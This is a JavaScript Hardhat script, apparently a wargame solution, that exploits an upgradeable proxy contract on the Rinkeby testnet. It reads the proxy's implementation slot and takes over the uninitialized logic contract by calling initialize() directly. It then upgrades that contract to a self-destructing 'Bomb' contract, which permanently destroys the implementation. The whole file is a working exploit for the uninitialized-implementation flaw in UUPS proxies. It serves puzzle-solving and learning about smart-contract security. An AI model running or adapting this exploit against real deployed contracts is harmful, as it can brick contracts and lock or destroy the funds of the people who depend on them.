const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x0c4BE8A66EE58636f3FE59eb599fb7Cb06e24017'
const abi = []

async function hack(contract, signer) {
    // Get the address for the engine that's stored in the implementation slot.
    const provider = ethers.getDefaultProvider('rinkeby');
    const engineAddrStorage = await provider.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
    const engineAddr = ethers.utils.getAddress('0x' + engineAddrStorage.slice(-40))
    console.log(engineAddr)

    const engineABI = ["function initialize() external", "function upgradeToAndCall(address newImplementation, bytes data) external", "function upgrader() external view returns (address)"];
    const engine = new ethers.Contract(engineAddr, engineABI, signer);

    // Initialize the engine directly (rather than via a delegatecall from another contract) to set yourself as upgrader of the engine.
    console.log(`Old Upgrader: ${await engine.upgrader()}`);
    const initTx = await engine.initialize();
    await initTx.wait();
    console.log(`New Upgrader: ${await engine.upgrader()}`);

    // Create bomb contract, which selfdestructs when initialized.
    const Bomb = await ethers.getContractFactory("Bomb");
    const bomb = await Bomb.deploy();
    await bomb.deployed();
    console.log("Bomb Deployed To:", bomb.address);

    // Upgrade the engine to the bomb contract and include the data to call initialize().
    let iface = new ethers.utils.Interface(["function initialize()"]);
    let encoded = iface.encodeFunctionData("initialize()", []);
    const upgradeTx = await engine.upgradeToAndCall(bomb.address, encoded);
    await upgradeTx.wait();
    console.log("Engine Destroyed");
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})